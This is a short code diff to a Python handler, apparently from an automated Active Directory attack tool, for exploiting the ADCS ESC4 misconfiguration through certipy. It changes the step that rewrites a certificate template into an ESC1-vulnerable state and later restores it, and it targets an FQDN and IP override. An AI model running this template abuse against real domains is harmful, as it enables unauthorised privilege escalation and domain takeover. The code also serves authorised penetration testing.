@@ -560,16 +560,20 @@ class ADCSESC4Handler(BaseEdgeHandler):
                 [],
             )
 
-        # Step 1: Modify template (save old config)
+        # Step 1: Modify template (save old config first, then rewrite
+        # to default ESC1-vulnerable config).  Use FQDN target_host +
+        # target_ip override so RPC doesn't fall back to NETBIOS.
         self.logger.info(
             "ESC4 Step 1: Modifying template '%s' to enable ESC1 condition",
             template_name,
         )
         mod_result = await certipy_template(
-            target=dc_host,
+            target=target_host,
+            target_ip=target_ip,
             template=template_name,
             auth_args=auth_args,
             save_old=True,
+            write_default=True,
         )
 
         if not mod_result["success"]:
@@ -628,7 +632,8 @@ class ADCSESC4Handler(BaseEdgeHandler):
         )
         if self._old_config_path:
             restore_result = await certipy_template(
-                target=dc_host,
+                target=target_host,
+                target_ip=target_ip,
                 template=template_name,
                 auth_args=auth_args,
                 save_old=False,
